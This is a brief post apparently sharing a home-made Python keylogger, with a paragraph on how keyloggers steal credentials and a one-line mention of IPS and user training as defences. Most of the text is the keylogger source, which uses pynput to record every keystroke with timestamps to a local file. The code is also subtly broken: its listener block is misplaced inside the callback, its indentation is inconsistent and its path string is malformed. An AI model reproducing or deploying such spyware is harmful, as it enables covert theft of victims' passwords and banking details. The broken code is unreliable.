This is a keylogger I wrote in python to capture keystrokes. A keylogger records the keystrokes the victim inputs and relays the information back to the bad actor by either creating a txt file or even emailing the data to the attacker. These can compromise login information, banking information, credentials and more. It is vital to protect against malware such as this by proper IPS and enduser training. 



import pynput
from pynput.keyboard import Key, Listener
import logging 

log_dir = r"C/Path/To/KeyLogger" 
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
   logging.info(str(key))

   with Listener(on_press=on_press) as listener:
listener.join()
